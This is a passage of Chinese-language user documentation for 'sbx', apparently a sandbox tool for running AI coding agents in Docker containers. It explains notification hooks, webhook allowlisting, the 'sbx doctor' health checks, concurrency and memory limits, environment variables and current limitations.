命令里能用的变量：`SBX_WS`、`SBX_TASK`、`SBX_EVENT`（idle/exit）、`SBX_STATE`、`SBX_TS`，以及 headless 的 `SBX_EXIT_CODE`。

> **注意引号**：`$SBX_TASK` 写在 shell 的**单引号**里不会被展开，webhook 收到的会是字面量 `$SBX_TASK`。sbx 不做任何变量替换（那会把 JSON 的转义搞乱），所以要展开就用双引号。`sbx doctor` 会检查这一点并提醒你。

几条保证：

- **通知永远不会卡住 Agent**：20 秒超时，交互模式下放后台跑，无论成败都返回 0。失败只记进 `~/.sbx/state/<ws>/<task>/notify.log`。
- **节流**：同一类通知在窗口内只发一次。`Notification` 是反复触发的事件。
- **webhook 的主机自动放行**：sbx 从命令里扫出 `http(s)://` 的主机名，作为"通知域名"层加进该 Task 的白名单，allowlist 模式下不用你再 `net allow`。主机名里有变量、或者写的是 IP 时扫不出来，`sbx run` 会提示你手动放行。
- **容器被 OOM 杀掉时收不到通知**：那种情况下 hooks 根本来不及跑，只能靠 `sbx ls` 的 `exited(oom)` 事后发现。
- 这两个键**不能写在项目层**（`<repo>/.sbx/sandbox.toml`），见下面的红线。

---

## 体检：`sbx doctor`（M3-13）

```console
$ sbx doctor
  ✓ docker      Docker 27.4.0，VM 内存 9.7g
  ✓ vm-memory   max_running(3) × 3g = 9.0g ≤ VM 内存 9.7g 的 95%
  ✓ upstream    http://host.docker.internal:7890 可用
  ✗ sbx-proxy   已停止，但有 1 个 shared Task 在跑（它们现在出不了网）
      → docker rm -f sbx-proxy 之后重新 sbx run
  ✓ login       已登录：you@example.com · team · claude.ai
  ! trust       .sbx/ 自上次确认后有变化
      → sbx trust
  ✓ notify      open.feishu.cn 已自动加入白名单
  ✓ smoke       运行中的 sbx-shop-e76272-fix 画面正常，没有卡在对话框上

1 项警告，1 项失败
```

八项检查：docker 可用性、VM 内存够不够（R10）、上游代理连通性、`sbx-proxy` 健康（R8）、登录态、信任状态、通知配置、首次启动冒烟（R9：claude 的内部状态字段随版本变化，卡在对话框上会让无人值守直接失效）。

- **只有 `✗` 才让 `sbx doctor` 非 0 退出**。`!` 的意思是"能用，但该改"——要是它也让命令失败，写进脚本的人就只能加 `|| true`，那警告就白给了。`--strict` 下警告也算失败。
- `--quick` 跳过慢的那项（冒烟检查）。
- 冒烟优先用现成的：有 Task 在跑就抓它的 tmux 画面，没有就跳过（`sbx run` 每次启动本来就会做这项检查）。
- **不要求你在 git 仓库里**。信任状态这类和仓库有关的项，不在仓库里时标成跳过。

---

## 并发与内存（M2-14、design §11、R10）

`sbx run` 在真要启动一个容器之前查两件事：

**并发**：正在运行的 agent 容器数达到 `max_running`（默认 3）就拒绝，并列出是谁占着。

```
$ sbx run api
sbx: 已经有 3 个 Task 在跑，达到 max_running = 3：shop-e76272.main、shop-e76272.fix、blog-a1b2c3.main
先 sbx stop 掉一个，或者在 ~/.sbx/config.toml 里调大 max_running（注意内存：每个 Task 上限 3g）
```

计数是**跨 Workspace 的**——`max_running` 管的是 Docker VM 的内存，而那是所有仓库共用的；限额本身取自你当前所在仓库的配置。`sbx run` 一个已经在跑的 Task 只是 attach，不占新名额，不会被自己挡住。启动一个已停止的 Task 同样要过这一关（design §10.1 把这步画在"新建"分支里，但重启一样多占一份内存）。

**内存预算**：`max_running × resources.memory` 超过 Docker VM 内存的 95% 时警告一次，不拒绝——`--memory` 是上限不是预留，用不满是常态。

```
警告: max_running(4) × resources.memory(3g) = 12.0g，超过 Docker VM 内存 9.7g 的 95%。
并发跑满时可能触发 VM 级 OOM；调小 max_running 或 memory，或者把 Docker 的内存调大。
```

VM 内存取自 `docker info` 的 `MemTotal`，Docker Desktop 下就是那台 VM 的内存，不是你机器的内存。算的是 agent 容器，代理不算在内：`sbx-proxy` 固定 128m，dedicated 模式下每个 Task 的 sidecar 各 128m，这部分算在留给 VM 的余量里。

阈值本来定的是 85%（R10），2026-10-09 放宽到 95%：85% 下推荐配置（10GB VM + 3 × 3g = 9g）自己就会报警，每次 `sbx run` 都刷一条，等于没有警告。95% 下推荐配置安静，而 `4 × 3g` 或 VM 只给 8GB 这类真的配过头的仍然会响。

---

## 环境变量

| 变量 | 作用 |
|---|---|
| `SBX_HOME` | sbx 数据目录，默认 `~/.sbx`。测试或多套环境隔离用 |
| `SBX_HOST_CLAUDE` | 宿主机 `~/.claude` 的位置，影响记忆导入导出 |
| `TZ` | 有则直接用，否则读 `/etc/localtime` 的软链；注入容器，让 Agent 的日志和提交时间跟你一致 |

容器里的 Agent 和通知命令能看到：`SBX_WS`、`SBX_TASK`，以及通知命令额外拿到的 `SBX_EVENT`、`SBX_STATE`、`SBX_TS`、`SBX_EXIT_CODE`（headless）。

## 当前的边界

- **没有 `sbx merge`**，合并永远是你在主仓库手动做；分支有 commit 没合并时 `done` 不会提醒。
- 上游代理只支持 http；只有 SOCKS 的宿主机代理需要你自己加一层转发（design §6.4）。
- **Codex 还没接**（M3-6）：`--agent codex` 和 `default_agent = "codex"` 目前会明确报错。
- 底层镜像必须是 Debian/Ubuntu 系（ADR 0007）。
